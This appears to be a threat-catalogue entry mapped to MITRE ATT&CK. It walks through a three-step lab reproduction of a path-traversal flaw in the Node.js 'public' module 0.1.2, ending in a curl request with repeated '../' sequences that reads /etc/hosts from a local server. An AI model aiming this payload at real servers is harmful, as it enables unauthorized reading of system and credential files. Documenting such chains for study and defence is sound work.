---
tags:
  - path-traversal
  - node-js
  - file-disclosure
  - arbitrary-file-read
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/curl]]'
  - '[[tools/public-module]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Vulnerable-Public-Module]]'
  - '[[procedures/Run-Vulnerable-Public-Server]]'
  - '[[procedures/Exploit-Path-Traversal-with-Curl]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:26:11.816Z'
description: >-
  A multi-step attack exploiting a path traversal vulnerability in the 'public'
  Node.js module to install the vulnerable package, run a static file server,
  and read sensitive files like /etc/hosts via crafted HTTP requests.
skill_level: intermediate
impact_level: high
id: 1138cf18-479c-4cbb-b2e1-6595e766dd07
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
---
# Path Traversal in Node.js 'public' Module to Disclose Arbitrary Server Files

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in the 'public' Node.js module version 0.1.2, allowing arbitrary file reads on the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Run Static File Server]
    B --> C[Exploit Path Traversal]
    C --> D[File Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/public-module]]
- [[tools/curl]]

### Target Environment

- Linux OS
- Node.js v8.9.4 LTS
- npm 5.6.0
- Port 8080 available

### Initial Access Requirements

- Local access to a Linux machine with Node.js installed
- No network credentials needed; exploits local server
- Ability to install packages via npm

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-Public-Module]]

**Objective**: Install the vulnerable 'public' module version 0.1.2 to set up the exploitable environment.

**Instructions**: Use [[commands/npm-install-public]] to fetch the package from the npm registry.

```bash
npm install public
```

**Expected Output**: Installation logs confirming the package is added to node_modules, including version 0.1.2.

**Success Indicators**:
- node_modules/public directory created
- No installation errors

### Step 2: Run Vulnerable Server
procedure: [[procedures/Run-Vulnerable-Public-Server]]

**Objective**: Launch the static file server using the vulnerable module to expose the path traversal endpoint on port 8080.

**Instructions**: Execute [[commands/run-public-server]] from the project directory to start serving files from the current directory.

```bash
./node_modules/public/bin/public ./ 8080
```

**Expected Output**: Server startup message indicating 'Public.js server running with "." on port 8080'.

**Success Indicators**:
- Server listening on http://127.0.0.1:8080
- No startup errors

### Step 3: Exploit Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-with-Curl]]

**Objective**: Send a crafted HTTP request to traverse directories and read an arbitrary sensitive file like /etc/hosts.

**Instructions**: With the server running, use [[commands/curl-path-traversal-exploit]] to request a path with multiple '../' sequences.

```bash
curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

**Expected Output**: HTTP 200 response body containing the contents of /etc/hosts, such as '127.0.0.1 localhost'.

**Success Indicators**:
- File contents disclosed in response
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Successful installation of the vulnerable 'public' module
2. Deployment of an exploitable static file server
3. Arbitrary file read demonstrating sensitive data disclosure

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Local System]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
